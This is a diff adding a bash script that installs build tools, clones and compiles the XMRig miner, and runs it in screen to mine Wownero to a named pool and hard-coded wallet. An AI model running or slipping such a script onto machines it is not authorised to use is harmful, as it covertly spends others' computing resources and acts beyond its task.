@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo apt update -y && sudo apt-get upgrade -y && echo Y | sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && sudo apt-get install cpulimit && git clone https://github.com/xmrig/xmrig.git && sudo sysctl -w vm.nr_hugepages=2048 && cd xmrig && mkdir build && cd build && cmake .. && make && screen ./xmrig -a rx/wow --donate-level 1 -o wownero.herominers.com:10661 -u So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5yneXVLL7Bt3AEKTacH4 -p x -t 6
